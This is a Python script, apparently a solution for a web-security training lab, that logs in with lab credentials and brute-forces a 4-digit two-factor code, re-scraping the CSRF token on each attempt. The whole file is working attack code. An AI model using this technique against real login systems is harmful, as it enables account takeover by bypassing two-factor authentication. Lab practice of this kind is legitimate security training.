import requests
from bs4 import BeautifulSoup

session = requests.Session()
login_page_url = "https://example.web-security-academy.net/login"
login_page2_url = "https://example.web-security-academy.net/login2"
response = session.get(login_page_url)
code = 1111

for i in range(10000):
    if "Please enter your 4-digit security code" in response.text:
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find("input", {"name": "csrf"})["value"]
        data = {
        "csrf": csrf_token,
        "mfa-code": code
        }
        response = session.post(login_page2_url, data=data)
        if "Incorrect security code" not in response.text: 
            print(response.text, code)
        else: 
            code+=1
    else:
        response = session.get(login_page_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find("input", {"name": "csrf"})["value"]
        data = {
            "csrf": csrf_token,
            "username": "carlos",
            "password": "montoya"
        }
        response = session.post(login_page_url, data=data)


        
